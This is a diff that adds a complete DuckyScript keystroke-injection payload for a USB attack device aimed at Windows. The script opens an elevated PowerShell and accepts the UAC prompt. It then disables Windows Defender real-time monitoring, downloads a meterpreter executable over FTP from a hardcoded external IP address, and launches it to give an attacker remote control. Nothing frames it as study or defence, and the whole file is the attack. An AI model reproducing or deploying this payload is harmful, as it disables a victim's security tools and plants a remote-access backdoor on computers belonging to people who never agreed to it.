@@ -1,0 +1,41 @@
+REM disables antivirus and downloads and runs meterpreter as admin (port forwarded)
+DELAY 700
+GUI x
+DELAY 250
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 450
+ALT y
+DELAY 700
+REM turns off the antivirus
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 600
+REM downloads the meterpreter
+STRING Invoke-WebRequest -uri "ftp://72.209.155.106/portforwarded_x64_meterpreter.exe" -OutFile "C:\meterpreter.exe"
+ENTER
+DELAY 700
+REM opens cmd to run the meterpreter
+STRING cmd
+ENTER
+DELAY 300
+REM starts the meterpreter
+STRING start C:\meterpreter.exe
+ENTER
+DELAY 200
+REM exits cmd then powershell
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
